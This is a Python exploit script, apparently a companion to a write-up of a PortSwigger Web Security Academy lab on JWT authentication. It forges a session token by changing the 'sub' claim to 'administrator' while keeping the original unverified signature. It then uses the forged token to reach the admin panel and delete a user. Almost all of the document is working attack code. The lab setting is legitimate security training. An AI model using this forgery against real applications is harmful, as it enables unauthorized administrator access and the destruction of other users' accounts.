#!/usr/bin/env python3
"""
JWT authentication bypass via unverified signature
PortSwigger Web Security Academy -- JWT

Companion script for the writeup: 01-unverified-signature.md

What this does:
    Logs in normally to get a genuine session JWT, then rebuilds the token
    with the payload's "sub" claim changed to "administrator" while keeping
    the original header and original (now-invalid) signature bytes as-is.
    If the server never re-verifies the signature against the new payload,
    it accepts the forged token anyway. Sending that as the session cookie
    to /admin, then hitting the delete link for carlos, solves the lab.

Usage:
    python 01-unverified-signature.py <lab-url>
    e.g. python 01-unverified-signature.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import base64
import json
import re
import sys
import httpx


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def decode_jwt(token: str) -> tuple[dict, dict, str]:
    parts = token.split(".")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig


def exploit_forge_unverified(jwt_token: str, new_claims: dict) -> str:
    """Forge a JWT with modified claims, keeping the original (unverified) signature."""
    header, payload, sig = decode_jwt(jwt_token)
    payload.update(new_claims)
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{sig}"


def _login(client: httpx.Client, base: str, username: str = "wiener", password: str = "peter") -> str:
    r = client.get(f"{base}/login")
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    csrf = m.group(1) if m else ""

    r = client.post(f"{base}/login", data={
        "csrf": csrf, "username": username, "password": password
    }, follow_redirects=False)
    if r.status_code in (301, 302):
        loc = r.headers.get("location", "/")
        if loc.startswith("/"):
            loc = f"{base}{loc}"
        client.get(loc, follow_redirects=True)
    return client.cookies.get("session", "")


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    session = _login(client, lab_url)
    if not session:
        print("[-] Login failed")
        return
    print(f"[+] Got session JWT: {session[:50]}...")

    forged = exploit_forge_unverified(session, {"sub": "administrator"})
    print(f"[+] Forged token with sub=administrator (original signature untouched)")

    client.cookies.clear()
    client.cookies.set("session", forged)
    r = client.get(f"{lab_url}/admin")
    print(f"[*] /admin -> {r.status_code}")

    if "/admin/delete" in r.text:
        r = client.get(f"{lab_url}/admin/delete?username=carlos")
        print(f"[*] Delete carlos -> {r.status_code}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- server never re-verified the signature against the tampered payload.")
    else:
        print("[-] Not solved yet -- check that the server actually skips signature verification.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
